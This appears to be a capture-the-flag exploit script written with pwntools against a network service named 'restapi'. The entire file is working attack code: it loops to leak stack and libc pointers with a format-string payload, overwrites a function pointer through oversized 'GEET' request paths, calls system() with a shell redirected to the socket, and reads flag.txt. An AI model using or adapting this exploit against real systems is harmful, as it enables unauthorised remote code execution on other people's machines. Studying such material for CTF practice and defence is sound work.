#!/usr/bin/env python3
from pwn import *
from os.path import dirname

def pad(path, path2):
    buf = b"\nGET "+path
    buf += b' '*(256-len(buf))
    buf += path2
    return buf

elf  = ELF(dirname(__file__) + "/../service/restapi")
libc = ELF(dirname(__file__) + "/../service/nix/store/65h17wjrrlsj2rj540igylrx7fqcd6vq-glibc-2.40-36/lib/libc.so.6")

winaddr = elf.symbols['__dprintf_chk'] & 0xFFFF
print(hex(winaddr))

while True:
    starter_remote=remote(sys.argv[1], sys.argv[2])
    port = int(starter_remote.recvline().decode().strip().split(" ")[-1])

    # TODO
    sleep(0.1)

    r=remote(sys.argv[1], port)
    r.send(b'GEET ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////'+b'A'*winaddr+b' \n')
    print(r.recvall())

    r=remote(sys.argv[1], port)

    r.send(pad(b'/4/0/%lu_%lu_%lu_%lu_%lu_%lu_%lu_%lu_%lu_%lu_%lu_%lu_%lu_%lu_%lu_%lu_%lu_%lu_%lu_%lu_%lu_%lu_%lu_%lu_%lu_%lu_%lu_%lu_%lu_%lu_%lu_%lu_%lu_%lu_%lu_%lu_%lu_%lu_%lu_%lu_%lu_end/meow', b'/$num/$num/$string/$string'))

    try:
        ptrs = [int(x) for x in r.recvuntil("_end", drop=True).decode().split("_")]
        break
    except EOFError:
        starter_remote.close()
        continue

for i,p in enumerate(ptrs):
    print(i, hex(p))

# offset inside __libc_start_call_main
libc_base = ptrs[32] - 0x2a1fc
stack_leak = ptrs[24]

callfunc = elf.symbols['call_func_with_args'] & 0xFFFF

r=remote(sys.argv[1], port)
r.send(b'GEET ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////'+b'A'*callfunc+b' \n')
print(r.recvall())

r=remote(sys.argv[1], port)
r.send(pad(f'/{libc_base+libc.symbols["system"]}/{stack_leak-0x1b0}/1/sh>&5<&5'.encode(), b'/$num/$num/$num/$string'))
r.sendline("cat flag.txt;echo ---")
print(r.recvuntil("---"))
